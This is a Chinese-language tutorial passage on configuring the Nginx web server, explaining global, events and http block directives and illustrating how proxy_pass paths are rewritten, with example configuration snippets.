href="#user指令"></a> user指令</h4><p>（1）user:用于配置运行Nginx服务器的worker进程的用户和用户组。</p><table><thead><tr><th>语法</th><th>user user [group]</th></tr></thead><tbody><tr><td>默认值</td><td>nobody</td></tr><tr><td>位置</td><td>全局块</td></tr></tbody></table><p>该属性也可以在编译的时候指定，语法如下<code>./configure --user=user --group=group</code>,如果两个地方都进行了设置，最终生效的是配置文件中的配置。</p><p>该指令的使用步骤:</p><p>(1)设置一个用户信息&quot;www&quot;</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">user</span> <span class="hljs-title">www</span>;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1586597350943.png" alt="1586597350943" /></p><p>(2) 创建一个用户</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">useradd www</span><br></code></pre></td></tr></table></figure><p>(3)修改user属性</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">user</span> <span class="hljs-title">www</span><br></code></pre></td></tr></table></figure><p>(4)创建<code>/root/html/index.html</code>页面，添加如下内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to nginx!<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">body</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">width</span>: <span class="hljs-number">35em</span>;</span><br><span class="language-css">        <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css">        <span class="hljs-attribute">font-family</span>: Tahoma, Verdana, Arial, sans-serif;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome to nginx!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>If you see this page, the nginx web server is successfully installed and<br>working. Further configuration is required.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>For online documentation and support please refer to<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://nginx.org/&quot;</span>&gt;</span>nginx.org<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>.<span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>Commercial support is available at<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://nginx.com/&quot;</span>&gt;</span>nginx.com<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Thank you for using nginx.<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>I am WWW<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>(5)修改nginx.conf</p><figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs glsl"><span class="hljs-keyword">location</span> / &#123;<br>root   /root/html;<br><span class="hljs-keyword">index</span>  <span class="hljs-keyword">index</span>.html <span class="hljs-keyword">index</span>.htm;<br>&#125;<br></code></pre></td></tr></table></figure><p>(5)测试启动访问</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">页面会报403拒绝访问的错误<br></code></pre></td></tr></table></figure><p>(6)分析原因</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">因为当前用户没有访问<span class="hljs-regexp">/root/</span>html目录的权限<br></code></pre></td></tr></table></figure><p>(7)将文件创建到 <code>/home/www/html/index.html</code>,修改配置</p><figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs glsl"><span class="hljs-keyword">location</span> / &#123;<br>root   /home/www/html;<br><span class="hljs-keyword">index</span>  <span class="hljs-keyword">index</span>.html <span class="hljs-keyword">index</span>.htm;<br>&#125;<br></code></pre></td></tr></table></figure><p>(8)再次测试启动访问</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">能正常访问。<br></code></pre></td></tr></table></figure><p>综上所述，使用user指令可以指定启动运行工作进程的用户及用户组，这样对于系统的权限访问控制的更加精细，也更加安全。</p><h4 id="work-process指令"><a class="markdownIt-Anchor" href="#work-process指令"></a> work process指令</h4><p>master_process:用来指定是否开启工作进程。</p><table><thead><tr><th>语法</th><th>master_process on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>master_process on;</td></tr><tr><td>位置</td><td>全局块</td></tr></tbody></table><p>worker_processes:用于配置Nginx生成工作进程的数量，这个是Nginx服务器实现并发处理服务的关键所在。理论上来说workder process的值越大，可以支持的并发处理量也越多，但事实上这个值的设定是需要受到来自服务器自身的限制，建议将该值和服务器CPU的内核数保存一致。</p><table><thead><tr><th>语法</th><th>worker_processes     num/auto;</th></tr></thead><tbody><tr><td>默认值</td><td>1</td></tr><tr><td>位置</td><td>全局块</td></tr></tbody></table><p>如果将worker_processes设置成2，则会看到如下内容:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581563242526.png" alt="1581563242526" /></p><h4 id="其他指令"><a class="markdownIt-Anchor" href="#其他指令"></a> 其他指令</h4><p>daemon：设定Nginx是否以守护进程的方式启动。</p><p>守护式进程是linux后台执行的一种服务进程，特点是独立于控制终端，不会随着终端关闭而停止。</p><table><thead><tr><th>语法</th><th>daemon on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>daemon on;</td></tr><tr><td>位置</td><td>全局块</td></tr></tbody></table><p>pid:用来配置Nginx当前master进程的进程号ID存储的文件路径。</p><table><thead><tr><th>语法</th><th>pid file;</th></tr></thead><tbody><tr><td>默认值</td><td>默认为:/usr/local/nginx/logs/nginx.pid</td></tr><tr><td>位置</td><td>全局块</td></tr></tbody></table><p>该属性可以通过<code>./configure --pid-path=PATH</code>来指定</p><p>error_log:用来配置Nginx的错误日志存放路径</p><table><thead><tr><th>语法</th><th>error_log  file [日志级别];</th></tr></thead><tbody><tr><td>默认值</td><td>error_log logs/error.log error;</td></tr><tr><td>位置</td><td>全局块、http、server、location</td></tr></tbody></table><p>该属性可以通过<code>./configure --error-log-path=PATH</code>来指定</p><p>其中日志级别的值有：debug|info|notice|warn|error|crit|alert|emerg，翻译过来为试|信息|通知|警告|错误|临界|警报|紧急，这块建议大家设置的时候不要设置成info以下的等级，因为会带来大量的磁盘I/O消耗，影响Nginx的性能。</p><p>（5）include:用来引入其他配置文件，使Nginx的配置更加灵活</p><table><thead><tr><th>语法</th><th>include file;</th></tr></thead><tbody><tr><td>默认值</td><td>无</td></tr><tr><td>位置</td><td>any</td></tr></tbody></table><h3 id="events块"><a class="markdownIt-Anchor" href="#events块"></a> events块</h3><p>（1）accept_mutex:用来设置Nginx网络连接序列化</p><table><thead><tr><th>语法</th><th>accept_mutex on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>accept_mutex on;</td></tr><tr><td>位置</td><td>events</td></tr></tbody></table><p>这个配置主要可以用来解决常说的&quot;惊群&quot;问题。大致意思是在某一个时刻，客户端发来一个请求连接，Nginx后台是以多进程的工作模式，也就是说有多个worker进程会被同时唤醒，但是最终只会有一个进程可以获取到连接，如果每次唤醒的进程数目太多，就会影响Nginx的整体性能。如果将上述值设置为on(开启状态)，将会对多个Nginx进程接收连接进行序列号，一个个来唤醒接收，就防止了多个进程对连接的争抢。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581566971955.png" alt="1581566971955" /></p><p>（2）multi_accept:用来设置是否允许同时接收多个网络连接</p><table><thead><tr><th>语法</th><th>multi_accept on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>multi_accept off;</td></tr><tr><td>位置</td><td>events</td></tr></tbody></table><p>如果multi_accept被禁止了，nginx一个工作进程只能同时接受一个新的连接。否则，一个工作进程可以同时接受所有的新连接</p><p>（3）worker_connections：用来配置单个worker进程最大的连接数</p><table><thead><tr><th>语法</th><th>worker_connections number;</th></tr></thead><tbody><tr><td>默认值</td><td>worker_commections 512;</td></tr><tr><td>位置</td><td>events</td></tr></tbody></table><p>这里的连接数不仅仅包括和前端用户建立的连接数，而是包括所有可能的连接数。另外，number值不能大于操作系统支持打开的最大文件句柄数量。</p><p>（4）use:用来设置Nginx服务器选择哪种事件驱动来处理网络消息。</p><table><thead><tr><th>语法</th><th>use  method;</th></tr></thead><tbody><tr><td>默认值</td><td>根据操作系统定</td></tr><tr><td>位置</td><td>events</td></tr></tbody></table><p>注意：此处所选择事件处理模型是Nginx优化部分的一个重要内容，method的可选值有select/poll/epoll/kqueue等，之前在准备centos环境的时候，我们强调过要使用linux内核在2.6以上，就是为了能使用epoll函数来优化Nginx。</p><p>另外这些值的选择，我们也可以在编译的时候使用</p><p><code>--with-select_module</code>、<code>--without-select_module</code>、</p><p><code>--with-poll_module</code>、<code>--without-poll_module</code>来设置是否需要将对应的事件驱动模块编译到Nginx的内核。</p><h4 id="events指令配置实例"><a class="markdownIt-Anchor" href="#events指令配置实例"></a> events指令配置实例</h4><p>打开Nginx的配置文件 nginx.conf,添加如下配置</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">events&#123;<br>accept_mutex on<span class="hljs-comment">;</span><br>multi_accept on<span class="hljs-comment">;</span><br>worker_commections <span class="hljs-number">1024</span><span class="hljs-comment">;</span><br>use epoll<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>启动测试</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./nginx</span> -t<br><span class="hljs-string">./nginx</span> -s <span class="hljs-keyword">reload</span><br></code></pre></td></tr></table></figure><h3 id="http块"><a class="markdownIt-Anchor" href="#http块"></a> http块</h3><h4 id="定义mime-type"><a class="markdownIt-Anchor" href="#定义mime-type"></a> 定义MIME-Type</h4><p>我们都知道浏览器中可以显示的内容有HTML、XML、GIF等种类繁多的文件、媒体等资源，浏览器为了区分这些资源，就需要使用MIME Type。所以说MIME Type是网络资源的媒体类型。Nginx作为web服务器，也需要能够识别前端请求的资源类型。</p><p>在Nginx的配置文件中，默认有两行配置</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">include mime.types<span class="hljs-comment">;</span><br>default_type application/octet-stream<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>（1）default_type:用来配置Nginx响应前端请求默认的MIME类型。</p><table><thead><tr><th>语法</th><th>default_type mime-type;</th></tr></thead><tbody><tr><td>默认值</td><td>default_type text/plain；</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>在default_type之前还有一句<code>include mime.types</code>,include之前我们已经介绍过，相当于把mime.types文件中MIMT类型与相关类型文件的文件后缀名的对应关系加入到当前的配置文件中。</p><p>举例来说明：</p><p>有些时候请求某些接口的时候需要返回指定的文本字符串或者json字符串，如果逻辑非常简单或者干脆是固定的字符串，那么可以使用nginx快速实现，这样就不用编写程序响应请求了，可以减少服务器资源占用并且响应性能非常快。</p><p>如何实现:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">/get_text</span> &#123;<br><span class="hljs-comment">#这里也可以设置成text/plain</span><br>    default_type text/html;<br>    return <span class="hljs-number">200</span> <span class="hljs-string">&quot;This is nginx&#x27;s text&quot;</span>;<br>&#125;<br><span class="hljs-keyword">location</span> <span class="hljs-title">/get_json</span>&#123;<br>    default_type application/json;<br>    return <span class="hljs-number">200</span> &#x27;&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;TOM&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>&#125;&#x27;;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="自定义服务日志"><a class="markdownIt-Anchor" href="#自定义服务日志"></a> 自定义服务日志</h4><p>Nginx中日志的类型分access.log、error.log。</p><p>access.log:用来记录用户所有的访问请求。</p><p>error.log:记录nginx本身运行时的错误信息，不会记录用户的访问请求。</p><p>Nginx服务器支持对服务日志的格式、大小、输出等进行设置，需要使用到两个指令，分别是access_log和log_format指令。</p><p>（1）access_log:用来设置用户访问日志的相关属性。</p><table><thead><tr><th>语法</th><th>access_log path[format[buffer=size]]</th></tr></thead><tbody><tr><td>默认值</td><td>access_log logs/access.log combined;</td></tr><tr><td>位置</td><td><code>http</code>, <code>server</code>, <code>location</code></td></tr></tbody></table><p>（2）log_format:用来指定日志的输出格式。</p><table><thead><tr><th>语法</th><th>log_format name [escape=default|json|none] string…;</th></tr></thead><tbody><tr><td>默认值</td><td>log_format combined “…”;</td></tr><tr><td>位置</td><td>http</td></tr></tbody></table><h4 id="其他配置指令"><a class="markdownIt-Anchor" href="#其他配置指令"></a> 其他配置指令</h4><p>（1）sendfile:用来设置Nginx服务器是否使用sendfile()传输文件，该属性可以大大提高Nginx处理静态资源的性能</p><table><thead><tr><th>语法</th><th>sendfile on|off；</th></tr></thead><tbody><tr><td>默认值</td><td>sendfile off;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>（2）keepalive_timeout:用来设置长连接的超时时间。</p><blockquote><p>为什么要使用keepalive？</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">我们都知道HTTP是一种无状态协议，客户端向服务端发送一个TCP请求，服务端响应完毕后断开连接。<br>如何客户端向服务端发送多个请求，每个请求都需要重新创建一次连接，效率相对来说比较多，使用keepalive模式，可以告诉服务器端在处理完一个请求后保持这个TCP连接的打开状态，若接收到来自这个客户端的其他请求，服务端就会利用这个未被关闭的连接，而不需要重新创建一个新连接，提升效率，但是这个连接也不能一直保持，这样的话，连接如果过多，也会是服务端的性能下降，这个时候就需要我们进行设置其的超时时间。<br></code></pre></td></tr></table></figure><table><thead><tr><th>语法</th><th>keepalive_timeout time;</th></tr></thead><tbody><tr><td>默认值</td><td>keepalive_timeout 75s;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>（3）keepalive_requests:用来设置一个keep-alive连接使用的次数。</p><table><thead><tr><th>语法</th><th>keepalive_requests number;</th></tr></thead><tbody><tr><td>默认值</td><td>keepalive_requests 100;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><h3 id="server块和location块"><a class="markdownIt-Anchor" href="#server块和location块"></a> server块和location块</h3><p>server块和location块都是我们要重点讲解和学习的内容，因为我们后面会对Nginx的功能进行详细讲解，所以这块内容就放到静态资源部署的地方给大家详细说明。</p><p>本节我们主要来认识下Nginx默认给的nginx.conf中的相关内容，以及server块与location块在使用的时候需要注意的一些内容。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>       <span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>;<br>       <span class="hljs-attribute">server_name</span>  localhost;<br>       <span class="hljs-section">location</span> / &#123;<br>           <span class="hljs-attribute">root</span>   html;<br>           <span class="hljs-attribute">index</span>  index.html index.htm;<br>       &#125;<br>      <br>       <span class="hljs-attribute">error_page</span>   <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span> <span class="hljs-number">404</span>  /50x.html;<br>       <span class="hljs-section">location</span> = /50x.html &#123;<br>           <span class="hljs-attribute">root</span>   html;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>        listen       <span class="hljs-number">8081</span>;<br>        server_name  localhost;<br> <br>        location / &#123;<br>            root   html;<br>            index  index.html index.htm;<br>        &#125;<br><span class="hljs-comment">#情景1:proxy_pass后有/ ，表绝对路径，不把匹配部分加入最终代理路径（location 和proxy_pass结尾一致）</span><br>        <span class="hljs-comment">#访问地址：http://localhost:8081/WCP.Service/wcp/modeladapter/download/asc.shtml</span><br>        <span class="hljs-comment">#最终代理：http://10.194.171.7:13082/modeladapter/download/asc.shtml</span><br>location <span class="hljs-regexp">/WCP.Service/</span>wcp<span class="hljs-regexp">/modeladapter/</span>download/ &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">10.194</span>.<span class="hljs-number">171.7</span>:<span class="hljs-number">13082</span><span class="hljs-regexp">/modeladapter/</span>download/;<br>        &#125;<br>        <br>        <span class="hljs-comment">#访问地址：http://localhost:8081/model/asc.shtml</span><br>        <span class="hljs-comment">#最终代理：http://127.0.0.1:8082/model/asc.shtml</span><br>location <span class="hljs-regexp">/model/</span> &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span><span class="hljs-regexp">/model/</span>;<br>        &#125;<br>        <br>        <br><span class="hljs-comment">#情景2:proxy_pass后有/ ，表绝对路径，不把匹配部分加入最终代理路径（location 和proxy_pass结尾不一致）</span><br>        <span class="hljs-comment">#访问地址：http://localhost:8081/model/asc.shtml</span><br>        <span class="hljs-comment">#最终代理：http://127.0.0.1:8082/asc.shtml</span><br>location <span class="hljs-regexp">/model/</span> &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span>/;<br>        &#125;<br><span class="hljs-comment">#情景3：proxy_pass后没有 / ，Nginx会把匹配部分带到代理的url</span><br>        <span class="hljs-comment">#访问地址：http://localhost:8081/model/asc.shtml</span><br>        <span class="hljs-comment">#最终代理：http://127.0.0.1:8082/model/asc.shtml</span><br>location <span class="hljs-regexp">/model/</span> &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span>;<br>        &#125;<br> <br><span class="hljs-comment">#情景4</span><br>        <span class="hljs-comment">#访问地址：http://localhost:8081/model/asc.shtml</span><br>        <span class="hljs-comment">#最终代理：http://127.0.0.1:8082/AAAmodel/asc.shtml</span><br>location <span class="hljs-regexp">/model/</span> &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span>/AAA;<br>        &#125;<br><span class="hljs-comment">#情景5</span><br>        <span class="hljs-comment">#访问地址：http://localhost:8081/model/asc.shtml</span><br>        <span class="hljs-comment">#最终代理：http://127.0.0.1:8082/asc.shtml</span><br>location /model &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span>/;<br>        &#125;<br><span class="hljs-comment">#情景6</span><br>        <span class="hljs-comment">#访问地址：http://localhost:8081/modelBBB/asc.shtml</span><br>        <span class="hljs-comment">#最终代理：http://127.0.0.1:8082/asc.shtml</span><br>location /model &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span>/;<br>        &#125;<br> <br> <br>location /opus-front-sso &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">10.194</span>.<span class="hljs-number">170.94</span>/opus-front-sso;<br>        &#125;<br>location /awater &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">10.194</span>.<span class="hljs-number">170.94</span>/awater;<br>        &#125;<br> <br>        <br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>        listen <span class="hljs-number">39002</span>;<br>        server_name  linux.nginx;<br>        location  <span class="hljs-regexp">/url/</span> &#123;<br>            rewrite ^<span class="hljs-regexp">/win/</span>(.*)$ <span class="hljs-regexp">/$1/</span> <span class="hljs-keyword">break</span>;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.1</span>:<span class="hljs-number">8091</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><a href="http://linux.nginx:39002/url/aa">http://linux.nginx:39002/url/aa</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39002</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <span class="hljs-section">location</span>  /url/ &#123;<br>            <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:8091/;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">#http://192.168.23.1:8091/aa</span><br><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39002</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <span class="hljs-section">location</span>  /url/ &#123;<br>            <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:8091/;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">#http://192.168.23.1:8091/url/aa</span><br>    <br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39002</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <span class="hljs-section">location</span>  /url &#123;<br>            <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:8091/;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">#http://192.168.23.1:8091/aa</span><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39002</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <span class="hljs-section">location</span>  /url &#123;<br>            <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:8091;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">#http://192.168.23.1:8091/url/aa</span><br></code></pre></td></tr></table></figure><h1 id="nginx进阶篇"><a class="markdownIt-Anchor" href="#nginx进阶篇"></a> Nginx进阶篇</h1><h2 id="nginx服务器基础配置实例"><a class="markdownIt-Anchor" href="#nginx服务器基础配置实例"></a> Nginx服务器基础配置实例</h2><p>前面我们已经对Nginx服务器默认配置文件的结构和涉及的基本指令做了详细的阐述。通过这些指令的合理配置，我们就可以让一台Nginx服务器正常工作，并且提供基本的web服务器功能。</p><p>接下来我们将通过一个比较完整和最简单的基础配置实例，来巩固下前面所学习的指令及其配置。</p><p>需求如下:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">（<span class="hljs-number">1</span>）有如下访问：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8081</span><span 